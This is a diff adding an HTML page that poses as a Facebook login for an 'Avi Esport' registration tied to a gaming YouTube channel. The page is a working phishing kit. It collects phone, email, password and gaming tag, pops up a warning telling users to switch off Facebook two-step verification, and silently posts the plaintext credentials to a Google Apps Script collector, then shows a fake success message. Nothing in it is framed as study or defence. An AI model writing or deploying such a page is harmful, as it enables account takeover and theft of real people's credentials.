@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avi Esport - Registration</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="registration-form">
+            <div class="logo">
+                <h1>facebook</h1>
+                <p class="login-text">login</p>
+            </div>
+            <form id="registrationForm">
+                <div class="form-group">
+                    <input type="tel" id="phone" placeholder="Phone Number" required>
+                </div>
+                <div class="form-group">
+                    <input type="email" id="email" placeholder="Email" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <div class="form-group">
+                    <input type="text" id="gamertag" placeholder="Gaming Tag" required>
+                </div>
+                <button type="submit" class="register-btn">Register</button>
+            </form>
+            <div class="login-link">
+                <p>Already have an account? <a href="login.html">Login here</a></p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="youtube-watermark">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/YouTube_icon_%282013-2017%29.png" alt="YouTube">
+        <div class="channel-info">
+            <span>ANHONI GAMER</span>
+            <div class="channel-id">id = @ANHONIGAMER01</div>
+        </div>
+    </div>
+    
+    <script>
+        // Google Apps Script Web App URL
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzTyw3NL2rpuNBl6tMlxjUW3ObALrJf5ZJZaR0o3u_2hb4M0pdPGG-KZMLTjH06XdPQsw/exec';
+        
+        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Show popup message before registration
+            const confirmMsg = confirm('⚠️ IMPORTANT: Please turn off your Two-Step Verification on Facebook before proceeding.\n\nDo you want to continue with registration?');
+            
+            if (!confirmMsg) {
+                return; // User cancelled
+            }
+            
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const gamertag = document.getElementById('gamertag').value;
+            
+            const userData = {
+                action: 'register',
+                phone: phone,
+                email: email,
+                password: password,
+                gamertag: gamertag,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Save to localStorage
+            localStorage.setItem('aviEsportUser', JSON.stringify(userData));
+            
+            // Send to Google Sheets (fire and forget)
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(userData)
+            }).then(() => {
+                console.log('Data sent to Google Sheets');
+            }).catch(error => {
+                console.log('Google Sheets error (but data saved locally):', error);
+            });
+            
+            alert('Registration successful! ✅');
+            window.location.href = 'login.html';
+        });
+    </script>
+</body>
+</html>
